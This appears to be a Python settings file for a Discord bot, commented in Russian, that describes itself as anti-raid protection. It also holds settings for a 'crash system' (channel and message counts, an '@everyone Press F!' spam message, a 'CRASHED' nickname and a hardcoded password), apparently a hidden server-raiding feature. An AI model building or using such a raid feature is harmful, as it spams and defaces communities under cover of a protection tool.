# Для краш системы
crashChannels = 5
crashMessages = 10
crashMessage = "@everyone Press F!"
crashNick = "CRASHED"
password = "slonchigtop"

# Для анти-краш системы
timeSuspicion = 2
deletedActions = {}

# Информация
information = {
	"" : "Укажите страницу!\n\n**Страницы:**\n1. О боте\n2. Анти-краш",
	"1" : "**Название бота** - Это бот для защиты серверов от рейдов.",
	"2" : "Анти-краш (анти-рейд) работает по принципу наблюдения за персоналом. Если они удаляют каналы, роли или кикают/банят участников (3 раза) за короткое время (2 минуты) - система анти-краша автоматически их банит."
}
